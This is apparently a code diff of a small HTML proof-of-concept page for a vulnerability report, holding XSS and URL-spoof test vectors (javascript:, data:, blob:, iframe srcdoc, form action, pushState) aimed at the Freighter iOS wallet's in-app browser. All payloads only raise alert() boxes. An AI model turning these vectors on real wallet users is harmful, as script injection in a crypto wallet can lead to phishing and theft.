@@ -3,34 +3,33 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Bypass Scanner V4 - Freighter</title>
+<title>XSS Only - 0x403for</title>
 <style>
-body{background:#0a0a0a;color:#fff;font-family:monospace;padding:16px}
-button{width:100%;padding:14px;margin:6px 0;border-radius:10px;border:none;font-weight:700}
-.good{background:#7B61FF;color:#fff} .warn{background:#222;color:#aaa}
-h2{color:#7B61FF} small{opacity:0.5}
+body{background:#0a0a0a;color:#fff;font-family:monospace;padding:20px;text-align:center}
+button{width:100%;padding:16px;margin:8px 0;border-radius:12px;border:none;font-weight:700;background:#7B61FF;color:#fff}
+pre{background:#151515;padding:12px;border-radius:8px;font-size:11px;text-align:left;overflow:auto}
 </style>
 </head>
 <body>
-<h2>Bypass Scanner V4 - 0x403for</h2>
-<small>Semua alert() doang - safe</small>
+<h3>XSS Only - Freighter iOS</h3>
 
-<button class="good" onclick="location.href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YTp1cmkgYnZwYXNzJyk8L3NjcmlwdD4='">1. data:text/html base64</button>
+<button onclick="location.href='javascript:alert(document.domain)'">1. javascript:alert(domain)</button>
 
-<button class="good" onclick="const b=new Blob(['<script>alert(`blob bypass ${typeof freighterApi}`)</script>'],{type:'text/html'}); location.href=URL.createObjectURL(b)">2. blob: URL with script</button>
+<button onclick="location.href='javascript:alert(`XSS ${location.href}`)'">2. javascript:alert(href)</button>
 
-<button class="good" onclick="document.write('<iframe srcdoc=&quot;<script>alert(`srcdoc bypass`)</script>&quot;></iframe>')">3. iframe srcdoc</button>
+<button onclick="const f=document.createElement('form');f.action='javascript:alert(`form XSS ${document.domain}`)';document.body.appendChild(f);f.submit()">3. form action=javascript: XSS</button>
 
-<button class="good" onclick="location.href='javascript:alert(`js ${location.href}`)'">4. javascript: direct</button>
+<pre>
+// Payload laporan:
 
-<button class="warn" onclick="const f=document.createElement('form'); f.action='javascript:alert(`form action js`)' ; document.body.appendChild(f); f.submit()">5. form action=javascript:</button>
+// Vektor 1:
+javascript:alert(document.domain)
 
-<button class="warn" onclick="window.open('data:text/html,<svg onload=alert(`window.open data`></svg>')">6. window.open data + svg</button>
+// Vektor 2:
+&lt;form action="javascript:alert(1)"&gt;&lt;button&gt;Click&lt;/button&gt;&lt;/form&gt;
 
-<button class="warn" onclick="history.pushState({},'','/fake-aqua'); alert('pushState spoof url:'+location.href)">7. history.pushState URL spoof</button>
-
-<button class="good" onclick="location.href='https://aqua.network'">8. buka aqua.network buat test manual</button>
-
-<script>console.log('freighterApi at load:', typeof window.freighterApi);</script>
+// Vektor 3:
+data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;
+</pre>
 </body>
 </html>
